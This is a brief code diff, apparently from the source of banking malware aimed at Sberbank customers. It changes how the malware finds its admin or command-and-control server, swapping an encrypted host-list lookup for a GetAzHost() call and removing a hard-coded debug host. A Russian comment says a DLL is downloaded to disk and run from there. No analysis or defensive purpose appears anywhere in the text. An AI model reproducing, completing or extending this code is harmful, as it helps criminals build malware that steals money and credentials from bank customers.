@@ -38,7 +38,8 @@ namespace SBER_DOWNLOAD_DLL
 }
 #define DBG SBER_DOWNLOAD_DLL::DBGOutMessage<>
 
-static char SBER_HOSTS[SBERHOSTS_PARAM_SIZE] = SBERHOSTS_PARAM_NAME;
+
+//static char SBER_HOSTS[SBERHOSTS_PARAM_SIZE] = SBERHOSTS_PARAM_NAME;
 
 //если DLL_FROM_DISK есть, то s.dll загружается на диск и запускается с диска
 #define DLL_FROM_DISK
@@ -119,16 +120,11 @@ static PCHAR GetNameDll(char* uid)
 
 static char* SberGetAdminUrl( char* url )
 {
-#ifdef DEBUGCONFIG
-	m_lstrcpy( url, "az.zika.in" ); //"bifit-dbo.ru" );
-#else
-
-	string host = GetActiveHostFromBuf2( SBER_HOSTS, 0x15D1BD02 /* __SBER_HOSTS__ */, SBERHOSTS_PARAM_ENCRYPTED );
+	string host = GetAzHost();
 	if( !host.IsEmpty() )
 		m_lstrcpy( url, host.t_str() );
 	else
 		url = 0;
-#endif
 	return url;
 }
 
